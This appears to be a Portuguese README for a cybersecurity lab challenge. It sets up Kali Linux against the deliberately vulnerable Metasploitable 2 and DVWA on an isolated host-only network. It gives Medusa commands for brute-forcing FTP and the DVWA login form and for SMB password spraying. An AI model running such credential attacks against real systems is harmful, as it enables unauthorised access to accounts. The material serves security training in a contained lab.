## Desafio Ataques Simulados com Kali e Medusa

### Um laboratório prático de segurança cibernética projetado para simular cenários de ataque de força bruta usando Kali Linux, Medusa e ambientes intencionalmente vulneráveis, como Metasploitable 2 e DVWA.
Este projeto demonstra estratégias de execução, documentação e mitigação de ataques em um ambiente virtual totalmente controlado.

O objetivo deste laboratório é explorar ataques de autenticação em diferentes serviços — FTP, Web Forms e SMB — usando a ferramenta Medusa no Kali Linux.

Todos os testes são realizados em VMs VirtualBox isoladas configuradas com uma Rede Somente para Host, garantindo um ambiente de prática de segurança seguro e contido.

O desafio é flexível: você pode seguir os cenários descritos aqui ou expandir com serviços adicionais, listas de palavras personalizadas, ferramentas alternativas e documentação estendida.

## Requerimentos
VirtualBox
Kali Linux VM
Metasploitable 2 VM (includes DVWA)
Host-Only Network adapter

## Configuração de Rede
Ambas as VMs devem estar conectadas ao mesmo Adaptador Somente para Host:
No VirtualBox, abra Configurações > Rede para cada VM.
Ativar Adaptador 2.
Defina o tipo de adaptador para Adaptador Somente para Host.
Inicialize ambas as máquinas e verifique a conectividade:

ping <metasploitable-ip>

## Força Bruta FTP (vsftpd em Metasploitable)

#### Exemplo de comando

medusa -h <target-ip> -u msfadmin -P wordlist.txt -M ftp

#### Validação

ftp <target-ip>

## Formulário da Web Brute Force (Página de Login DVWA)

Serviço: Formulário de login HTTP (POST)

#### Passos:

Execute o DVWA no Metasploitable.
Defina o nível de segurança DVWA como Baixo.
Identifique o endpoint de login vulnerável: /login.php

#### Exemplo de comando

(Ajuste os parâmetros de acordo com os campos de formulário da DVWA.)
medusa -h <target-ip> \
    -u admin \
    -P wordlist.txt \
    -M web-form -m FORM:"login.php" -m DENY:"Login failed"

### Spray pass com Medusa

medusa -h <target-ip> -U users.txt -p Password123 -M smbnt


